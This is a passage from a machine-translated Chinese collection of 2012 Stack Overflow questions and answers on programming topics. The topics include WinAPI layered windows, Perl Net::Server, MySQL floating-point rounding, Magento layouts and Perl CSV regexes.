<lastmod>2012-05-03T23:00:00Z</lastmod>
<changefreq>weekly</changefreq>
<priority>1.0</priority>
</url>
</urlset> 
```

不幸的是，如果我用记事本显示我的 xml，所有这些都在一行中

```
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<url><loc>11111</loc><lastmod>2012-05-03T23:00:00Z</lastmod><changefreq>weekly</changefreq><priority>1.0</priority></url>
</urlset> 
```

使用 createnode xmldom 方法生成 xml 节点即时消息！我的错在哪里？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:22:08.680

如果您使用 XSLT 生成 XML，您应该能够在样式表顶部的**xsl:output元素上指定 then** **indent**属性。

 **```
<xsl:output method="xml" version="1.0" indent="yes"/> 
```

如果您希望缩进文档的唯一原因是让您更容易手动阅读和编辑，则可能值得使用与记事本不同的编辑器来查看文件。（例如，我使用 Notepad++，它可以缩进 XML）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:01:14.200

也许试试`createwhitespace`？

[http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.createwhitespace.aspx](http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.createwhitespace.aspx)**

# adsense - 如何避免 Google Adsense 程序拒绝“仅登录”？

> ID：10446549
> 
> 赞同：3
> 
> 时间：2012-05-04T09:51:53.603
> 
> 标签：adsense

我目前正在尝试为客户设置一个 Adsense 帐户，以便他们可以在他们的网站上投放广告。这是一个新网站，已被 Google 拒绝，因为他们说这是一个“仅限登录”网站。虽然该网站确实具有注册/登录的能力（鼓励这样做），但所有页面无需注册即可公开访问，但如果您已登录，则它们会变得更加个性化（例如，在搜索结果页面上，它会列出您与每个用户的距离和如果您已登录，类似这样的相关信息）。网站上没有只能在登录时查看的页面。我知道 GoogleBot 本身无法说明这一点，但解决此问题的公认方法是什么？

我已经阅读了其他地方的建议，以从网站上完全删除登录部分，重新​​提交，等待批准，然后再次添加登录选项，但这似乎谷歌可能认为我们正在试图欺骗他们（我们不是）而且我不想让他的帐户因为做坏事而被封锁。我们显然可以在 Adsense 的站点身份验证部分中添加登录信息，这可能会解决问题并允许 GoogleBot 看到登录背后的信息，但这在激活帐户之前无法完成，这似乎相当矛盾。我想知道我是否将网站添加到我的 Adsense 帐户，添加身份验证信息以便它可以抓取它，然后重新提交这是否可行？或者，我们可以在一个完全不同的网站上设置他的 Adsense，

我将非常感谢有关如何以适当和正确的方式处理此问题的信息，以免在将来造成问题。

非常感谢，

戴夫

# c++ - winapi - 如何正确使用 LayeredWindows

> ID：10446550
> 
> 赞同：0
> 
> 时间：2012-05-04T09:51:54.053
> 
> 标签：c++, windows, winapi

我无法理解 UpdateLayaredWindow api 的概念、它的工作原理以及如何实现它。例如，我想覆盖 CFrameWnd 并使用 UpdateLayeredWindow 绘制一个自定义的 alpha 混合框架，据我所知，绘制子控件的唯一方法是：将它们混合到框架的位图缓冲区（使用 CreateCompatibleBitmap 创建）并重绘整个框架，或者创建另一个位于分层框架顶部并定期绘制子控件的窗口（这违背了分层窗口的整个想法，因为窗口区域无论如何都不会更新）。

如果我使用第一种方法，则重新绘制整个框架 - 这对于大型应用程序来说肯定是不切实际的......？还是帧总是不断更新，所以修改位图缓冲区不会导致额外的重绘。

类似于我想要实现的窗口的一个示例是 Skype 通知框/来电框。一个半透明的框架/窗口，顶部有子控件，您可以在屏幕上移动。

在实际的商业世界中，我该怎么做？请不要让我参考文档，我知道它在说什么；我需要有人解释我应该用来实现它的基础设施的实用方法。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T13:10:39.533

目前还不清楚分层窗口的哪个方面会给您带来问题，我将简要介绍它们是如何实现的，并从中解释它们的局限性。

分层窗口是通过使用称为“层”的视频适配器的硬件特性来实现的。适配器具有组合来自不同视频内存块的像素的基本能力，在将它们发送到监视器之前将它们混合。明显的例子是鼠标光标，它叠加在桌面帧缓冲区的像素上，因此当您移动鼠标时不需要花费太多精力来为其设置动画。或者用于显示视频的叠加层，视频流解码器将视频像素直接写入单独的帧缓冲区。或者由顶层窗口的框架投射在其后面的窗户之上的阴影。

视频适配器在组合它们的值时允许对两个像素值进行一些简单的逻辑操作。第一个很明显，混合操作让*一些*像素值与背景像素重叠。该效果提供*opacity*，您可以在窗口后面看到部分背景。

第二个是颜色键控，当电视上的气象员站在气象图前时，您会看到这种效果。他实际上站在一个绿色屏幕前，摄像机混合面板过滤掉绿色并用天气地图中的像素替换它。这种效果提供了纯粹的*透明度*。

您可以在传递给 UpdateLayeredWindow() 的参数中看到这一点，您必须在代码中调用该函数来设置分层窗口。dwFlags 参数选择视频硬件支持的基本操作，ULW_ALPHA 标志启用不透明效果，ULW_COLORKEY 标志启用透明效果。透明效果需要使用 crKey 参数值指定的颜色键。不透明度效果由 pblend 参数控制。这是为未来的扩展而构建的，尚未发生。BLENDFUNCTION 结构中唯一有趣的字段是 SourceConstantAlpha，它控制不透明度的量。

因此，可用于分层窗口的基本效果是不透明度，与背景窗口重叠并保持部分可见。对整个窗口的一个限制是部分不透明，包括边框和标题栏。这看起来不太好，您通常希望创建一个无边框窗口并承担创建自己的窗口框架的负担。顺便说一句，需要一堆代码。

基本效果是透明度，完全隐藏窗口的一部分。您经常希望*将这*两种效果结合起来，这需要*两个*分层窗口。一个提供部分不透明度，另一个在顶部并由底部拥有，它显示不透明的窗口部分，如控件。使用颜色键使其背景透明并使底部窗口可见。

除此之外，自定义窗口的另一个重要功能是由 SetWindowRgn() 启用的。它可以让你给窗口一个矩形以外的形状。同样重要的是省略边框和标题栏，它们不适用于形状窗口。编程工作是以一种与其他应用程序创建的窗口的外观没有太大区别的雅致方式组合这些功能，并编写代码来绘制替换窗口部件并仍然使窗口功能像一个常规窗口。例如，调整窗口大小和移动窗口之类的事情，通常是通过自定义处理 WM_NCHITTEST 消息来实现的。

# .net - 点网中的并发计算

> ID：10446559
> 
> 赞同：0
> 
> 时间：2012-05-04T09:52:35.530
> 
> 标签：.net, concurrency

点网并发计算有几种方式？他们的优点和缺点是什么？

我用谷歌搜索，只发现使用 Thread 类的解决方案。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:54:58.530

查看 .Net 4 中的并行编程 [http://www.codeproject.com/Articles/71285/Introducing-NET-4-0-Parallel-Programming](http://www.codeproject.com/Articles/71285/Introducing-NET-4-0-Parallel-Programming)

# perl - 在 Net::Server 中断开客户端的最快方法

> ID：10446560
> 
> 赞同：1
> 
> 时间：2012-05-04T09:52:37.123
> 
> 标签：perl

我有一些必须尽可能快的脚本（用作 mpd5 up/down 脚本）。

有这个想法：让这个脚本将参数发送到某个 tcp 服务器并完成工作，然后服务器会努力工作并且长时间工作。

这是我使用 Net::Server 的测试服务器脚本：

```
use Net::Server::PreForkSimple;
use base "Net::Server::PreForkSimple";

  sub process_request {
     my $self=shift;
     my $a=<STDIN>;
     close STDIN; close STDOUT; #trying to disconect client here
     $self->log(1,"start $a");
     sleep 50;
     $self->log(1,"finish $a");
      }
__PACKAGE__->run(port => 2000); 
```

问题是：我不知道如何在 $a= 之后在线断开客户端。客户端脚本等待所有这些“睡眠 50”。我正在尝试关闭 STD*，但它没有帮助。此外，我无法在此 Net::Server 的文档中找到任何关闭或断开连接的方法。

谁能指出我正确的方向？

升级版：

```
close($self->{server}->{client}); 
```

也不行。

我测试这个

```
echo test | nc 127.0.0.1 2000 
```

这个命令工作了 50 秒。

但我希望 nc 在发送“测试”后立即关闭。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:19:12.740

您应该`$self->post_process_request`在关闭连接后使用该方法执行代码。

```
use Net::Server::PreForkSimple;
use base "Net::Server::PreForkSimple";

sub process_request {
    my $self=shift;
    my $a=<STDIN>;
}

sub post_process_request {
    $self->log(1,"start $a");
    sleep 50;
    $self->log(1,"finish $a");
} 
```

但请记住，请求处理子进程在 50 秒内仍然不可用，因此如果您想尽快处理许多请求，这可能不是您的正确解决方案，因为您可能会用完子进程来处理这些要求。在这种情况下，我建议使用像[Gearman](http://gearman.org/)或[beanstalkd](http://kr.github.com/beanstalkd/)这样的消息队列。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-01T01:47:33.250

在我在 rt.cpan.org 上发布这个 Q 之后，我得到了一个答案：

快速断开的正确代码是：

```
use base "Net::Server::PreForkSimple";

sub process_request {
    my $self = shift;
    my $a = <STDIN>;
    $self->post_process_request;
    $self->log(1,"start $a");
    sleep 50;
    $self->log(1,"finish $a");
}
__PACKAGE__->run(port => 2000); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-01T04:39:04.447

post_process_request 是一个很好的答案 - 但要关闭客户端连接，您需要首先调用 SUPER::post_process_request，因为这是关闭客户端句柄的地方。更好的答案是将该代码放入 post_client_connection_hook 中，该代码在客户端全部消失后处理。

```
sub process_request {
    my $self = shift;
    $self->{'a'} = <STDIN>;
}

sub post_client_connection_hook {
    my $self = shift;
    my $a = $self->{'a'};
    $self->log(1,"start $a");
    sleep 50;
    $self->log(1,"finish $a");
} 
```

# android - 跟踪用户捕获的图像

> ID：10446564
> 
> 赞同：0
> 
> 时间：2012-05-04T09:52:54.720
> 
> 标签：android, count, photo

用户使用他设备中的相机拍照。我的应用程序应该跟踪用户拍摄的照片数量。
我不希望我的应用程序启动任何默认相机。我想为用户使用他的设备相机点击的照片增加计数。

由于具有软按钮摄像头的设备无法正常工作`CAMERA_BUTTON`，因此还有其他方法可以计算。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:57:21.880

> 我的应用程序应该跟踪用户拍摄的照片数量

一般来说，这是不可能的。您无法监视其他应用程序的任意操作。

最接近的是 julian 建议的 - 使用 a`FileObserver`来监控`Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)`。但是，并非所有相机应用程序都会将它们的图片存储在那里。

# magento - Magento：仅覆盖布局 xml-File 的一部分

> ID：10446572
> 
> 赞同：2
> 
> 时间：2012-05-04T09:53:55.973
> 
> 标签：magento, layout

我只想更改文件 checkout.xml 的一部分（该文件位于核心布局文件夹中）。我在我的 config.xml 中创建自己的扩展并链接到我自己的 layout-xml-File。

```
<layout>

  <updates>
    <checkout>
     <file>mymodule_checkout.xml</file>
    </checkout>
  </updates>
</layout> 
```

没有问题，当我复制整个文件 checkout.xml 并将其保存为 mymodule_checkout.xml 时。但我只想覆盖这个大文件的一小部分

```
<reference name="content"> 
```

和

```
</reference> 
```

在这种情况下，当我只写我需要的部分时，magento 只用这些部分读取我的文件。所以magento不会得到原始checkout.xml的剩余部分。

是否可以只更改核心布局 xml-File 的一部分而不复制整个文件或更改核心。

mymodule.xml 的代码如下所示：

```
<layout version="0.1.0">

<checkout_onepage_index translate="label">

    <reference name="content">
        <block type="checkout/onepage" name="checkout.onepage" template="checkout/onepage.phtml">
            <block type="checkout/onepage_login" name="checkout.onepage.login" as="login" template="checkout/onepage/login.phtml">
                <block type="page/html_wrapper" name="checkout.onepage.login.before" as="login_before" translate="label">
                    <label>Login/Registration Before</label>
                    <action method="setMayBeInvisible">
                        <value>1</value>
                    </action>
                </block>
                <block type="checkout/onepage_billing" name="checkout.onepage.billing" as="billing" template="checkout/onepage/billing.phtml"/>
                <block type="checkout/onepage_shipping" name="checkout.onepage.shipping" as="shipping" template="checkout/onepage/shipping.phtml"/>
            </block>
            <block type="checkout/onepage_shipping_method" name="checkout.onepage.shipping_method" as="shipping_method" template="checkout/onepage/shipping_method.phtml">
                <block type="checkout/onepage_shipping_method_available" name="checkout.onepage.shipping_method.available" as="available" template="checkout/onepage/shipping_method/available.phtml"/>
                <block type="checkout/onepage_shipping_method_additional" name="checkout.onepage.shipping_method.additional" as="additional" template="checkout/onepage/shipping_method/additional.phtml"/>
            </block>
            <block type="checkout/onepage_payment" name="checkout.onepage.payment" as="payment" template="checkout/onepage/payment.phtml">
                <block type="checkout/onepage_payment_methods" name="checkout.payment.methods" as="methods" template="checkout/onepage/payment/methods.phtml">
                    <action method="setMethodFormTemplate">
                        <method>purchaseorder</method>
                        <template>payment/form/purchaseorder.phtml</template>
                    </action>
                </block>
            </block>
            <block type="checkout/onepage_review" name="checkout.onepage.review" as="review" template="checkout/onepage/review.phtml"/>
        </block>
    </reference>
</checkout_onepage_index>
</layout> 
```

这就是我需要的部分。在这种情况下，magento 只使用此代码而不是核心 xml 文件的剩余代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T13:38:53.090

绝对没错。Magento 将您所有的布局文件合并为一个，包括来自后备主题的文件。在处理完所有文件后仍然相关的内容就是用于生成布局的内容，只要您的 xml 格式正确，您就可以覆盖任何 .xml 文件中的任何部分 - 即只是因为它被称为 page.xml 不会意味着您不能在 foobarbaz.xml 中覆盖它。

您的问题很可能出在您的 XML 上，您能否发布其中的内容，`mymodule_checkout.xml`以便我可以弄清楚您正在尝试做什么，并希望为您提供一个有效的替代品？

# css - 将 CSS 倾斜变换应用于元素时，反向倾斜值是多少？

> ID：10446573
> 
> 赞同：1
> 
> 时间：2012-05-04T09:53:58.067
> 
> 标签：css, transform, rotation, reverse, skew

我正在使用 CSS 变换倾斜和旋转一个元素，我想通过应用“反向”变换使内部元素再次看起来正常。使用旋转很容易：如果您有一个旋转 45 度的元素，那么内部元素将旋转 -45 度以再次看起来“正常”。

现在，旋转和倾斜并不那么容易。在此处查看此示例：http: [//jsfiddle.net/8R4ym/56/](http://jsfiddle.net/8R4ym/56/)

文本以至少正确定位的方式旋转和倾斜，但我似乎无法找到“规则”，使其看起来完全正常，应用某种反向变换。有任何想法吗？非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T17:50:29.163

我相信这是您正在寻找的效果：http: [//jsfiddle.net/8R4ym/108/](http://jsfiddle.net/8R4ym/108/)

我相信[非交流](https://web.archive.org/web/20210807102242/https://planetmath.org/ExampleOfCommutative)操作会破坏您的形象。执行倾斜和旋转的顺序很重要。“变换”似乎从左到右执行它们（首先旋转然后倾斜）并且不会让您在单个定义空间中使用两次“变换”属性。我找不到任何方法来更改执行操作的顺序，因此我插入了另一个 div，以便在第二次旋转之前执行倾斜。我希望这就是你要找的。

编辑：我只是注意到文本大小的微小差异。我认为您可能需要进行一些修改才能将文本大小增加一定百分比。

# facebook - open_basedir 限制生效。File() 不在允许的路径内，并且未捕获 CurlException：3：未设置 URL！在 base_facebook.php 中抛出

> ID：10446574
> 
> 赞同：1
> 
> 时间：2012-05-04T09:54:01.963
> 
> 标签：facebook, facebook-graph-api, web-applications, curl, facebook-php-sdk

```
protected function makeRequest($url, $params, $ch=null) {
    if (!$ch) {
      $ch = curl_init();
    }

    $opts = self::$CURL_OPTS;
    if ($this->useFileUploadSupport()) {
      $opts[CURLOPT_POSTFIELDS] = $params;
    } else {
      $opts[CURLOPT_POSTFIELDS] = http_build_query($params, null, '&');
    }
    $opts[CURLOPT_URL] = $url;

    // disable the 'Expect: 100-continue' behaviour. This causes CURL to wait
    // for 2 seconds if the server does not support this header.
    if (isset($opts[CURLOPT_HTTPHEADER])) {
      $existing_headers = $opts[CURLOPT_HTTPHEADER];
      $existing_headers[] = 'Expect:';
      $opts[CURLOPT_HTTPHEADER] = $existing_headers;
    } else {
      $opts[CURLOPT_HTTPHEADER] = array('Expect:');
    }

    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);

    if (curl_errno($ch) == 60) { // CURLE_SSL_CACERT
      self::errorLog('Invalid or no certificate authority found, '.
                     'using bundled information');
      curl_setopt($ch, CURLOPT_CAINFO,
                  dirname(__FILE__) . '/fb_ca_chain_bundle.crt');
      $result = curl_exec($ch);
    }

    if ($result === false) {
      $e = new FacebookApiException(array(
        'error_code' => curl_errno($ch),
        'error' => array(
        'message' => curl_error($ch),
        'type' => 'CurlException',
        ),
      ));
      curl_close($ch);
      throw $e;
    }
    curl_close($ch);
    return $result;
  } 
```

我已经构建了一个 facebook 应用程序，但是在 base_facebook.php 的这段代码中出现了问题。

[完整的代码在这里](http://pastebin.com/TnYDN7Qg)。我每次得到的都是这2个错误-

1.警告：curl_setopt_array() [function.curl-setopt-array]: open_basedir 限制生效。File() 不在允许的路径内： (/home/:/usr/lib/php:/tmp) 在 /home/a2424901/public_html/base_facebook.php 的第 802 行

2.Uncaught CurlException: 3: 没有设置 URL！在第 814 行的 /home/a2424901/public_html/base_facebook.php 中抛出

[这](http://pastebin.com/1aZiBDbe)是我的 facebook 应用程序的代码，即（index.php）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T09:13:50.673

是的，不明显的错误消息。但这意味着[realpath()](http://php.net/manual/en/function.realpath.php)返回空值：

> File() 不在允许的路径内...

确保传递给 realpath() 函数的文件确实存在于指定路径中。

您的示例中的其他异常是由此问题引起的。顺便说一句，将所有弱点（在您的示例中 - Facebook API 调用）包装在 try-catch 块中是一种很好的做法。

# debugging - 为什么 Chrome 在所有网站中都引用“data:text/css”？

> ID：10446575
> 
> 赞同：6
> 
> 时间：2012-05-04T09:54:03.527
> 
> 标签：debugging, google-chrome, adblock

在调试网站时，我在正在调试的页面正文下方发现了这个标签：

```
<link rel="stylesheet" type="text/css" href="data:text/css,"> 
```

我认为一些疯狂的 Javascript 错误正在将它添加到我的网站。但是我在项目的所有源代码中都找不到类似的东西。

在使用 Firefox 进行检查后，我注意到只有 Chrome 会在元素视图、资源视图和网络视图中显示此标签。但它在 Chrome 的“查看源代码”中不可见。

这是关于什么的？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-08T19:45:34.120

我遇到了同样奇怪的 css 链接，发现这是由于我启用了 Chrome 的 AdBlockPlus (ADB) 扩展。当我禁用该扩展时，链接不再出现。

# php - MySQL圆形奇怪的错误

> ID：10446581
> 
> 赞同：6
> 
> 时间：2012-05-04T09:54:14.953
> 
> 标签：php, mysql

我正面临一个非常奇怪的¿错误？现在在 mysql+php 上。是一个简单的选择，在以下示例中，我使用多个字段来尝试解释我的问题：

*   “字段”是 11.5
*   $phpvar 是 1.15

MySQL查询：

```
select round(field * " . $phpvar . " ,2) as a1, 
       round(field * 1.15 ,2) as a2, 
       round(11.5 * " . $phpvar . " ,2) as a3, 
       round(11.5 * 1.15 ,2) as a4, 
       field * " . $phpvar . " as a5 
from ... 
```

好的，我正在尝试获得 13.23。`"field" * $phpvar = 13.225`，所以使用 round(13.225,2) 我应该得到 13.23，对吗？好吧，是的，也不是。

查询结果：

*   a1 [round(field * " . $phpvar . " ,2)] => 13.22
*   a2 [round(field * 1.15 ,2)] => 13.22
*   a3 [round(11.5 * " . $phpvar . " ,2)] => 13.23
*   a4 [round(11.5 * 1.15 ,2)] => 13.23
*   a5 [field * " . $phpvar . "] => 13.225 (无圆)

我错过了什么？怎么可能，在使用“场”时，我的结果是假的？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-04T10:20:36.697

问题是如何存储 DOUBLE 和 FLOAT 值。

11.5 或 22.475 之类的值有可能（并且很可能）存储为近似值，例如 11.499999999999~ 或 22.475000000000000001，因此某些计算或舍入可能会导致不正确的结果。

将浮点值存储到**DECIMAL** coulmn 类型总是更好，其中该值与所有十进制数字完全存储并且不近似。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-04T11:20:15.590

确切的数字文字（例如`1.15`所有四个示例中的 the 和`11.5`后两个示例中的 the ）使用 MySQL 的类型进行[编码。](http://dev.mysql.com/doc/en/precision-math-numbers.html)`DECIMAL`

`field`在您的前两个示例中，将(of type `DOUBLE`) 与此类文字相乘的结果是 another `DOUBLE`，它使用[8 字节](http://dev.mysql.com/doc/en/storage-requirements.html) [IEEE 标准](http://dev.mysql.com/doc/en/numeric-type-overview.html)浮点表示（即[binary64](http://en.wikipedia.org/wiki/Double_precision_floating-point_format)）存储。但是，在此表示中`13.225` 编码为`0x402A733333333333`，其位表示：

```
符号           ：0b0

有偏指数：0b10000000010
               = 1026（表示包括 +1023 的偏差，因此 exp = 3）

有效    数字：0b[1.]1010011100110011001100110011001100110011001100110011
               = [1.]6531249999999999555910790149937383830547332763671875
                    ^ 隐藏位，不以二进制表示形式存储

```

这相当于：

```
  (-1)^ 0 * 1.6531249999999999555910790149937383830547332763671875 * 2^ 3 
=          13.2249999999999996447286321199499070644378662109375000

```

因此，将此结果四舍五入到小数点后两位得出`13.22`not `13.23`。

使用两种类型执行乘法运算`DECIMAL`，例如后两个示例中使用的两个文字，会产生另一个`DECIMAL`. 在此表示中，`13.225`以[二进制编码的十进制](http://dev.mysql.com/doc/en/storage-requirements.html)格式进行编码，具有精确的精度，因此舍入运算结果`13.23`符合预期。

如[MySQL 手册](http://dev.mysql.com/doc/en/problems-with-float.html)中所述：

> 浮点数有时会引起混淆，因为它们是近似值而不是存储为精确值。SQL 语句中写入的浮点值可能与内部表示的值不同。尝试在比较中将浮点值视为精确可能会导致问题。它们还受平台或实现依赖关系的影响。[`FLOAT`](http://dev.mysql.com/doc/en/numeric-types.html)和[`DOUBLE`](http://dev.mysql.com/doc/en/numeric-types.html)数据类型受这些问题的影响。对于[`DECIMAL`](http://dev.mysql.com/doc/en/numeric-types.html)列，MySQL 以 65 位十进制数字的精度执行操作，这应该可以解决最常见的不准确问题。

如果您追求精确的精度，`DECIMAL`可能更适合您的要求。如果您需要的范围/性能`DOUBLE`但仍希望获得所需的舍入结果，您可以在舍入之前[`CONVERT`](http://dev.mysql.com/doc/en/cast-functions.html#function_convert)将乘法的结果。`DECIMAL`

# php - 在 php 脚本中未定义

> ID：10446582
> 
> 赞同：-1
> 
> 时间：2012-05-04T09:54:18.753
> 
> 标签：php, javascript, lightbox

当我单击此处的缩略图时，为什么在大照片下出现未定义，如何解决此问题？我试过把这里的所有东西都注释掉没有效果？以下是代码和供审查的 URL：

[http://tinyurl.com/6pbkhg7](http://tinyurl.com/6pbkhg7)

```
<td><div id="loadarea" style="width: 400px; height: 300px;">
<img width="400" height="300" src="http://www.mydomain.com/feeds/fmfl/rets_images/<?php echo(rawurlencode($row['ListingRid'])); ?>_1.jpg" alt="<?php echo(rawurlencode($row['MLNumber'])); ?>" align="left"  border="0">
</div>

<?
$image = "<br>";
$ListingRid = $row['ListingRid'];
$img_cnt = 1;
//$image .= "<a href=/feeds/fmfl/rets_images/{$ListingRid}_1.jpg rel=\"enlargeimage\" rev=\"targetdiv:loadarea,trigger:click\"><img src=/feeds/fmfl/rets_images/{$ListingRid}_1.jpg alt='' width='100' height='75' border='0' /></a>&nbsp;";
for ($c=1;$c<10;$c++) {
    if ($c<10)
        $c_ext = $c;
    else
        $c_ext = $c;

    if (file_get_contents("http://www.mydomain.com/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg"))
        $image .= "<a href=/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg rel=\"enlargeimage\" rev=\"targetdiv:loadarea,trigger:click\"><img src=/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg alt='' width='100' height='75' border='0' /></a>&nbsp;";
    else
        $c=12;
    $img_cnt++;
    if ($img_cnt == 5) {
        $image .= "<br>";
        $img_cnt = 0;
    }

}

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:00:44.797

因为您缺少标题标签

试试这个标题：

```
$image .= "<a href=/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg rel=\"enlargeimage\" rev=\"targetdiv:loadarea,trigger:click\" title=\"THIS IS TITLE\"><img src=/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg alt='' width='100' height='75' border='0' /></a>&nbsp;"; 
```

或者这个没有标题：

```
$image .= "<a href=/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg rel=\"enlargeimage\" rev=\"targetdiv:loadarea,trigger:click\" title=\"\"><img src=/feeds/fmfl/rets_images/{$ListingRid}_{$c_ext}.jpg alt='' width='100' height='75' border='0' /></a>&nbsp;"; 
```

灯箱需要一个标题，`title=""`如果你不想要任何东西，你应该设置。

# regex - Perl Regex：如何从 CSV 行中删除引号内的引号

> ID：10446583
> 
> 赞同：3
> 
> 时间：2012-05-04T09:54:19.047
> 
> 标签：regex, perl, double-quotes, lookahead, lookbehind

我有一个 CSV 文件中的一行，其中包含字段分隔符`"`和`,`字段分隔符作为字符串。有时`"`，数据中存在破坏字段封闭符的数据。我正在寻找一个正则表达式来删除这些`"`.

我的字符串如下所示：

```
my $csv = qq~"123456","024003","Stuff","","28" stuff with more stuff","2"," 1.99 ","",""~; 
```

我看过[这个](http://www.regular-expressions.info/lookaround.html)，但我不明白如何告诉它只删除引号

1.  不在字符串的开头
2.  不在字符串的末尾
3.  前面没有`,`
4.  后面没有`,`

我设法用这行代码告诉它同时删除 3 和 4 ：

```
$csv =~ s/(?<!,)"(?!,)//g; 
```

但是，我无法将`^`and`$`放在那里，因为前瞻和后瞻都不喜欢写成`(?<!(^|,))`.

除了拆分字符串并从每个元素中删除引号之外，有没有办法仅使用正则表达式来实现这一点？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-04T09:57:10.550

对于操作 CSV 数据，我建议使用[Text::CSV](http://search.cpan.org/~makamaka/Text-CSV-1.21/lib/Text/CSV.pm) - CSV 数据中有很多潜在的复杂性，虽然可以构建代码来处理自己，但当有一个经过试验和测试的 CPAN 模块时，这是不值得的它给你

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-04T10:18:37.870

不要使用正则*表达式*来解析 CSV 文件，CPAN 提供了很多好的模块，比如 nickifat 建议的，使用[Text::CSV](http://search.cpan.org/~makamaka/Text-CSV-1.21/lib/Text/CSV.pm)或者你可以使用[Text::ParseWords 之](http://perldoc.perl.org/Text/ParseWords.html)类的

```
use Text::ParseWords;  
while (<DATA>) {
chomp;     
my @f = quotewords ',', 0, $_;     
print join "|" => @f; 
}  

__DATA__ 
"123456","024003","Stuff","",""28" stuff with more stuff","2"," 1.99 ","","" 
```

输出：

```
123456|024003|Stuff||28 stuff with more stuff|2| 1.99 || 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T10:07:03.310

这应该有效：

```
$csv =~ s/(?<=[^,])"(?=[^,])//g 
```

`1`并`2`暗示逗号前后必须至少有一个字符，因此是积极的环顾四周。`3`并`4`暗示这些字符可以是逗号以外的任何东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-11-14T00:35:14.407

感谢您的帮助。我遇到了嵌入双引号的格式错误的 CSV 问题。我会对正则表达式的前瞻部分做一点补充，否则行尾的空值将被破坏：

```
(?<=[^,])\"(?=[^,\n]) 
```

添加 \n 将消除与行尾最后一个双引号的匹配。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-05-04T14:32:05.700

建议的

```
$csv =~ s/(?<=[^,])"(?=[^,])//g; 
```

可能是最好的答案。如果没有这些高级正则表达式功能，您也可以使用

```
$csv =~ s/([^,])"([^,])/$1$2/g; 
```

或者

```
$csv = join (',', map {s/"//g;"\"$_\""} split (',', $csv)); 
```

我认为您应该知道您的字符串格式不正确 csv。在 csv 文件中，值内的双引号必须加倍 (http://en.wikipedia.org/wiki/Comma-separated_values)。使用您的格式，值不能包含逗号附近的引号。

csv 不是那么简单的格式。如果您决定使用“真正的” csv，则应该使用模块。否则，您可能应该删除所有双引号以简化您的代码并澄清您没有使用 csv。

# javascript - 在所有使用 javascript 的浏览器中禁用 Save & Save As 选项

> ID：10446585
> 
> 赞同：0
> 
> 时间：2012-05-04T09:54:20.377
> 
> 标签：javascript

我想在所有浏览器（如 Internet Explorer、Chrome、Firefox、Opera 等）中禁用“另存为”和“保存”选项。我已经禁用了右键单击我的网页。代码在这里：

```
 var message="Function Disabled!"; 
     function clickIE4()
       if(event.button==2){
          alert(message);
          return false; 
       }
    } 
    function clickNS4(e){
      if(document.layers||document.getElementById&&!document.all){
        if (e.which==2||e.which==3){  
          alert(message);
          return false; 
        } 
     } 
   } 
   if (document.layers){  
     document.captureEvents(Event.MOUSEDOWN);
     document.onmousedown=clickNS4;
   } 
   else if(document.all&&!document.getElementById){
       document.onmousedown=clickIE4; 
   }  
   document.oncontextmenu=new Function("alert(message);return false") 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-05-04T09:55:50.497

> 我想在所有浏览器中禁用另存为和保存选项，

你不能。

> 我已经禁用右键单击

不是很有效。

* * *

DRM 在旨在支持它的系统（例如 DVD 播放器）中不能很好地工作。在不支持它的系统（例如网络浏览器）中，它的效果要差得多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-04T09:58:33.090

通过打开您的网页，用户已经下载了它 - 不可能制作一个可以查看但无法保存的网页。

当然，你可以阻止一些方法，就像你一样——你甚至可以使用一些复杂的 ajax 或 flash 来真正搞砸它们。但最终总会有办法绕过它。我建议您寻找一种不同的方法来将数据保存在您想要的位置。例如，如果问题是人们“窃取”了您的图像，您可以为它们添加水印。

# c# - C#中的SortedHashTable

> ID：10446586
> 
> 赞同：0
> 
> 时间：2012-05-04T09:54:23.380
> 
> 标签：c#, data-structures, hashtable, sortedset

我要做的是对 NP 完全问题实施启发式方法：我有一个对象列表（匹配项），每个对象都有一个双倍分数。我正在获取按分数 desc 排序的列表中的第一个元素，然后将其从列表中删除。然后将删除绑定到第一个元素的所有元素。我遍历列表，直到没有更多元素。

我需要一个可以有效解决这个问题的数据结构，所以基本上它应该具有以下属性：
1\. 通用
2\. 总是排序
3\. 具有快速键访问

现在`SortedSet<T>`看起来是最合适的。

问题是：就我而言，它是最佳选择吗？

`List result = new List();
while (sortedItems.Any())
{
var first = sortedItems.First();
result.Add(first);
sortedItems.Remove(first);
foreach (var dependentFirst in first.DependentElements)
{
sortedItems.Remove(dependentFirst);
}
}`

